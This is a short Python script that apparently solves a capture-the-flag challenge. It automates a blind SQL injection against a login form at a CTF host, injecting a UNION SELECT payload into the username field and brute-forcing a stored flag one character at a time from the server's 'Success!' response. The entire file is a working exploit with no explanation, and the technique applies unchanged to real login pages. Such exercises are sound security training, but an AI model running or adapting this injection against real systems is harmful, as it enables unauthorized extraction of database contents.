#!/usr/bin/env python3

import requests, string

url = "http://ctf.adl.tw:12004/login.php"
username = "' union select 1,2,3,flag from ctf where substr(flag,{},1) = \"{}\";--"
password = "1234"
flag = ""

for i in range(1, 51):
    print("progress : " + str(i) + " / 50")
    for c in string.ascii_letters + string.digits:
        r = requests.post(url, data = {"ctf_username" : username.format(str(i), c), "ctf_password" : password})
        if "Success!" in r.text:
            flag += c
            break
    print("flag : " + flag)

